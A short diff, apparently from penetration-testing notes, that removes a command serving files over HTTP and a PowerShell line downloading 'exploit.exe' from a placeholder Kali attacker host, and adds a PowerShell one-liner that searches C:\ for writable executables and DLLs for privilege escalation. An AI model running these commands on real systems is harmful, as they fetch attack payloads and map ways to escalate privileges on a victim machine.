@@ -1,2 +1,1 @@
-python3 -m http.server 8000
-powershell -c "Invoke-WebRequest -Uri http://<KALI_IP>:8000/exploit.exe -OutFile exploit.exe"
+Get-ChildItem -Path C:\ -Include *.exe,*.dll -Recurse -ErrorAction SilentlyContinue |  Where-Object {    $_.Attributes -notmatch 'Directory' -and     (Test-Path $_.FullName -PathType Leaf) -and    ((Get-Acl $_.FullName).AccessToString -match "Write")  } | Select-Object FullName
